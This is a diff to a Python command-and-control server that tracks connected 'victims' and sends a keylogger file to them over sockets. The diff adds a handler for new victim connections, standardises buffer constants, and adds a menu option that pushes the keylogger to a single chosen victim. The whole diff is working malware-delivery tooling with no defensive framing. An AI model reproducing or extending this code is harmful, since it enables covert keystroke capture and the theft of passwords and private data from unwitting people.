@@ -136,11 +136,11 @@ def initial_connect_to_client(sockets_list: list, connected_clients: dict,
         # Add the new client socket to the connected_clients dictionary (Key/Value pair)
         connected_clients[target_socket] = (dest_ip, dest_port)
         sockets_list.append(target_socket)
-        return True, target_socket
+        return target_socket
 
     except Exception as e:
         print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
-        return False, None
+        return None
 
 
 def connect_to_client_with_prompt(sockets_list: list, connected_clients: dict):
@@ -167,6 +167,13 @@ def connect_to_client_with_prompt(sockets_list: list, connected_clients: dict):
     except Exception as e:
         print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
         return False, None, None, None
+
+
+def process_new_connections(server_socket: socket.socket, sockets_to_read: list, client_dict: dict):
+    client_socket, client_address = server_socket.accept()
+    print(constants.NEW_CONNECTION_MSG.format(client_address))
+    sockets_to_read.append(client_socket)
+    client_dict[client_socket] = client_address
 
 
 def disconnect_from_client(sockets_list: list, connected_clients: dict):
@@ -207,7 +214,7 @@ def transfer_file(sock: socket.socket,
                   dest_port: int):
     # Send to victim a notification that it is transferring a file
     sock.send(constants.TRANSFER_KEYLOG_MSG.encode())
-    ack = sock.recv(1024).decode()
+    ack = sock.recv(constants.BYTE_LIMIT).decode()
 
     if ack == constants.RECEIVED_CONFIRMATION_MSG:
         # Send file name
@@ -217,7 +224,7 @@ def transfer_file(sock: socket.socket,
         # Open and Read the file to be sent
         with open(constants.KEYLOG_FILE_NAME, 'rb') as file:
             while True:
-                data = file.read(1024)
+                data = file.read(constants.BYTE_LIMIT)
                 if not data:
                     break
                 sock.send(data)
@@ -226,7 +233,7 @@ def transfer_file(sock: socket.socket,
         sock.send(constants.END_OF_FILE_SIGNAL)
 
         # Get an ACK from victim for success
-        transfer_result = sock.recv(1024).decode()
+        transfer_result = sock.recv(constants.BYTE_LIMIT).decode()
 
         if transfer_result == constants.VICTIM_ACK:
             print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
@@ -261,6 +268,28 @@ def find_specific_client_socket(client_dict: dict,
     except ValueError as e:
         print(constants.INVALID_INPUT_ERROR.format(e))
         return None, None, None
+
+
+def perform_menu_item_3(client_dict: dict):
+    # Check if client list is empty
+    if len(client_dict) == constants.ZERO:
+        print(constants.FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR)
+
+    # Handle single client in client list
+    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
+        client_socket, (client_ip, client_port) = next(iter(client_dict.items()))
+        transfer_file(client_socket, client_ip, client_port)
+
+    # Send keylogger to any specific connected victim
+    elif len(client_dict) != constants.ZERO:
+        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
+        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
+        target_socket, target_ip, target_port = find_specific_client_socket(client_dict,
+                                                                            target_ip, target_port)
+        if target_socket:
+            transfer_file(target_socket, target_ip, target_port)
+        else:
+            print(constants.TARGET_VICTIM_NOT_FOUND)
 
 
 if __name__ == '__main__':
